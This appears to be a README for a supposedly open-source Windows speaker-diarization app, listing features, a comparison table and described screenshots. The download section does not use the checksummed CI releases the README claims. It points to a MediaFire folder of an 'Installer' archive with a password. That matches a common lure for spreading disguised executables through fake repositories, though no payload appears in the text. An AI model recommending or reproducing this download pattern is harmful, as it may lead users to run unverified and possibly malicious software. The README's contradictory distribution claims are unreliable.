# speaker-map

🗺️ Free, open-source speaker diarization for Windows — see who spoke when, rename voices, export tracks. 100 MB portable, offline, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Who spoke when** — recordings split into speaker turns with a color timeline you can trust
- ✅ **Local diarization models** — ONNX pipelines run on your machine; interviews never reach a cloud
- ✅ **Speaker renaming** — click a lane, type a real name, and every turn, export and transcript follows
- ✅ **Merge and split turns** — fix the model's mistakes by hand and the labels propagate
- ✅ **Per-speaker export** — each voice written as its own audio track and transcript file
- ✅ **Batch interviews** — a folder of recordings diarized overnight with consistent naming
- ✅ **100 MB self-contained exe** — runtime bundled, models download separately, offline after that, MIT

## Why speaker-map

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB build - no setup required, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **speaker-map** | pyannote scripts | Cloud transcription | Audacity manual |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free, OSS | Paid per hour | Free, OSS |
| Open source | **Yes** | Yes | No | Yes |
| GUI turn correction | **Yes** | No | Partial | Manual labels
| Audio stays local | **Yes** | Yes | Upload | Yes
| Per-speaker track export | **Yes** | Scripted | Rare | No
| Portable, no install | **Yes, 100 MB** | Python env | Browser | Installer

## FAQ

**how to identify who spoke when in an interview recording offline?**

Diarization usually lives in a research repo where a single dependency bump breaks the evening, and cloud services bill per hour of audio. speaker-map gives you a color timeline, one-click renaming and per-speaker track exports locally. It is a 100 MB portable exe, MIT, offline.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark timeline (#121418, violet #C084FC): waveform with four colored speaker lanes, turn blocks labeled speaker 1 to 4, playhead at 12 minutes 40 seconds.
2. Rename flow: lane context menu open with speaker 3 selected, text field typing Marina, propagation note reading updates 87 turns and 1 transcript.
3. Export step: per-speaker checkboxes all on, track format WAV, transcript formats list showing txt and srt, summary chip reading 4 tracks written.

## Download

| Source | Link |
|---|---|
| 💾 **Installer speaker-map** | [Installer speaker-map](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET 8 SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).